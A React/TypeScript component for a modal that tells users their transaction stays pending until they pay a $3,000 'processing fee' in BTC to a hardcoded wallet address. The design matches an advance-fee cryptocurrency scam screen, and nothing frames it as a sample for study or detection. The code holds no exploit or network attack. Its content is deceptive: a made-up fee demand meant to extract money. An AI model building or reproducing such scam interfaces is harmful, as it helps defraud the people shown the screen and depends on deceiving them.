import { Bitcoin, X } from 'lucide-react';

interface ConfirmationFeeModalProps {
  isOpen: boolean;
  onClose: () => void;
  transactionAmount: number;
}

export function ConfirmationFeeModal({ isOpen, onClose, transactionAmount }: ConfirmationFeeModalProps) {
  if (!isOpen) return null;

  const FEE_AMOUNT = 3000;
  const WALLET_ADDRESS = "bc1qjkm5p52lu8ra3rce6xdk2536y4d9rpagzahfww";

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-[#151820] rounded-xl p-6 w-full max-w-md relative">
        <button
          onClick={onClose}
          className="absolute top-4 right-4 text-gray-400 hover:text-white"
        >
          <X className="w-5 h-5" />
        </button>

        <div className="text-center mb-6">
          <div className="inline-block p-3 bg-yellow-500/10 rounded-full mb-4">
            <Bitcoin className="w-8 h-8 text-yellow-500" />
          </div>
          <h2 className="text-xl font-bold text-white mb-2">Transaction Fee Required</h2>
          <p className="text-gray-400 text-sm">
            To complete your transaction of ${transactionAmount.toLocaleString()}, a processing fee is required
          </p>
        </div>

        <div className="bg-[#1E2128] p-4 rounded-lg mb-6">
          <div className="flex justify-between mb-4">
            <span className="text-gray-400">Fee Amount:</span>
            <span className="text-white font-medium">${FEE_AMOUNT.toLocaleString()}</span>
          </div>
          <div className="text-sm text-gray-400 mb-4">
            Send exactly ${FEE_AMOUNT} worth of BTC to:
          </div>
          <div className="bg-[#151820] p-3 rounded-lg break-all text-sm text-white font-mono">
            {WALLET_ADDRESS}
          </div>
        </div>

        <div className="text-sm text-gray-400 text-center mb-6">
          Your transaction will remain pending until the fee is processed
        </div>

        <button
          onClick={onClose}
          className="w-full bg-[#3D89F5] py-2 px-4 rounded-lg text-white hover:bg-blue-600"
        >
          I Understand
        </button>
      </div>
    </div>
  );
}